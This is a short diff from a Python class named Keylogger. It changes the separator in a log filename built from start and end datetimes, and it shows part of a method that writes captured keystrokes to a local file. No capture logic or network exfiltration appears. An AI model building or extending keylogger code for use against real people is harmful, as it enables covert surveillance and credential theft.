@@ -57,7 +57,7 @@ class Keylogger:
         # construct the filename to be identified by start & end datetimes
         start_dt_str = self.formatTime(self.start_dt)
         end_dt_str = self.formatTime(self.end_dt)
-        self.filename = f"{start_dt_str}---{end_dt_str}"
+        self.filename = f"{start_dt_str}-+-{end_dt_str}"
 
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
